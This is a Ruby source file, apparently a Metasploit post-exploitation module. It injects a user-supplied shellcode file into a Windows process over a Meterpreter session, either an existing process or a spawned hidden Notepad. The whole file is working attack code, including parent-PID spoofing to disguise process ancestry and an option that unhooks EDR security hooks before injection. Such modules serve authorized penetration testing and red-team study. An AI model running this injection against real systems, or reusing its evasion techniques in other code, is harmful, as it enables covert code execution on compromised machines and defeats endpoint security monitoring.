##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/post/common'

class MetasploitModule < Msf::Post
  include Msf::Post::Common
  include Msf::Post::Windows::Process

  def initialize(info={})
    super( update_info( info,
      'Name'          => 'Windows Manage Memory Shellcode Injection Module',
      'Description'   => %q{
        This module will inject into the memory of a process a specified shellcode.
      },
      'License'       => MSF_LICENSE,
      'Author'        => [ 'phra <https://iwantmore.pizza>' ],
      'Platform'      => [ 'win' ],
      'SessionTypes'  => [ 'meterpreter' ]
    ))

    register_options(
      [
        OptPath.new('SHELLCODE', [true, 'Path to the shellcode to execute']),
        OptInt.new('PID', [false, 'Process Identifier of process to inject the shellcode. (0 = new process)', 0]),
        OptInt.new('PPID', [false, 'Process Identifier for PPID spoofing when creating a new process. (0 = no PPID spoofing)', 0]),
        OptBool.new('CHANNELIZED', [true, 'Retrieve output of the process', false]),
        OptBool.new('INTERACTIVE', [true, 'Interact with the process', false]),
        OptBool.new('HIDDEN', [true, 'Spawn an hidden process', true]),
        OptBool.new('AUTOUNHOOK', [true, 'Auto remove EDRs hooks', false]),
        OptInt.new('WAIT_UNHOOK', [true, 'Seconds to wait for unhook to be executed', 5]),
        OptEnum.new('BITS', [true, 'Set architecture bits', '64', ['32', '64']])
      ])
  end

  # Run Method for when run command is issued
  def run
    # syinfo is only on meterpreter sessions
    print_status("Running module against #{sysinfo['Computer']}") if not sysinfo.nil?

    # Set variables
    shellcode = IO.read(datastore['SHELLCODE'])
    pid = datastore['PID']
    ppid = datastore['PPID']
    bits = datastore['BITS']
    p = nil
    if bits == '64'
      bits = ARCH_X64
    else
      bits = ARCH_X86
    end

    # prelim check
    if client.arch == ARCH_X86 and @payload_arch == ARCH_X64
      fail_with(Failure::BadConfig, "Cannot inject a 64-bit payload into any process on a 32-bit OS")
    end

    if datastore['PPID'] and datastore['PID']
      print_error("PID and PPID are mutually exclusive")
      return false
    end

    # Start Notepad if Required
    if pid == 0
      if ppid and not has_pid?(ppid)
        print_error("Process #{ppid} was not found")
        return false
      elsif ppid
        print_status("Spoofing PPID #{ppid}")
      end
      print_status("Spoofing PPID #{ppid}")
      notepad_pathname = get_notepad_pathname(bits, client.sys.config.getenv('windir'), client.arch)
      vprint_status("Starting  #{notepad_pathname}")
      proc = client.sys.process.execute(notepad_pathname, nil, {
        'Hidden' => datastore['HIDDEN'],
        'Channelized' => datastore['CHANNELIZED'],
        'Interactive' => datastore['INTERACTIVE'],
        'ParentPid' => datastore['PPID']
      })
      print_status("Spawned Notepad process #{proc.pid}")
    else
      if datastore['CHANNELIZED'] && datastore['PID'] != 0
        fail_with(Failure::BadConfig, "It's not possible to retrieve output when injecting existing processes!")
      elsif datastore['CHANNELIZED'] && datastore['PPID'] != 0
        fail_with(Failure::BadConfig, "It's not possible to retrieve output when using PPID spoofing!")
      end
      unless has_pid?(pid)
        print_error("Process #{pid} was not found")
        return false
      end
      begin
        proc = client.sys.process.open(pid.to_i, PROCESS_ALL_ACCESS)
      rescue Rex::Post::Meterpreter::RequestError => e
        print_error(e.to_s)
        fail_with(Failure::NoAccess, "Failed to open pid #{pid.to_i}")
      end
      print_status("Opening existing process #{proc.pid}")
    end

    # Check
    if bits == ARCH_X64 and client.arch == ARCH_X86
      print_error("You are trying to inject to a x64 process from a x86 version of Meterpreter.")
      print_error("Migrate to an x64 process and try again.")
      return false
    end
    if arch_check(bits, proc.pid)
      if datastore['AUTOUNHOOK']
        print_status("Executing unhook")
        print_status("Waiting #{datastore['WAIT_UNHOOK']} seconds for unhook Reflective DLL to be executed...")
        unless inject_unhook(proc, bits, datastore['WAIT_UNHOOK'])
          fail_with(Failure::BadConfig, "Unknown target arch; unable to assign unhook dll")
        end
      end
      begin
        inject(shellcode, proc)
      rescue ::Exception => e
        print_error("Failed to inject Payload to #{proc.pid}!")
        print_error(e.to_s)
      end
    else
      fail_with(Failure::BadConfig, "Arch mismatch between shellcode and process!")
    end
  end

  def inject(shellcode, proc)
    mem = inject_into_process(proc, shellcode)
    proc.thread.create(mem, 0)
    print_good("Successfully injected payload into process: #{proc.pid}")
    if datastore['INTERACTIVE'] && datastore['CHANNELIZED'] && datastore['PID'] == 0
      print_status("Interacting")
      client.console.interact_with_channel(proc.channel)
    elsif datastore['CHANNELIZED'] && datastore['PID'] == 0
      print_status("Retrieving output")
      data = proc.channel.read
      print_line(data) if data
    end
  end
end
